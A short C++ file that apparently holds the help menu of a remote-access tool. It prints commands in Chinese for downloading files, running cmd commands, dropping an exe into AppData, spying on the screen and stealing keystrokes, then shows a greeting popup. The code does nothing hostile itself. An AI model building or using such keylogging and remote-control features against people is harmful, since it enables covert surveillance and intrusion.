//#include "values.h"
#include <iostream>
#include<cstring>
#include <Windows.h>
using namespace std;

int main(){
	cout<<"·····$xx.png--->下载xx.png，需要绝对路径"<<endl;
	cout<<"·····@whoami--->执行cmd命令whoami"<<endl;
	cout<<"·····#xx.exe--->上传xx.exe到用户目录AppData\\Local\\xx.exe"<<endl;
	cout<<"·····EYE------->窥屏"<<endl;
	cout<<"·····KEY------->键盘窃取"<<endl;
	cout<<"·····&249------>弹窗：249"<<endl;
	MessageBoxW(NULL, L"你好，我是LCR", L"提示", MB_OK);
	return 0;
}


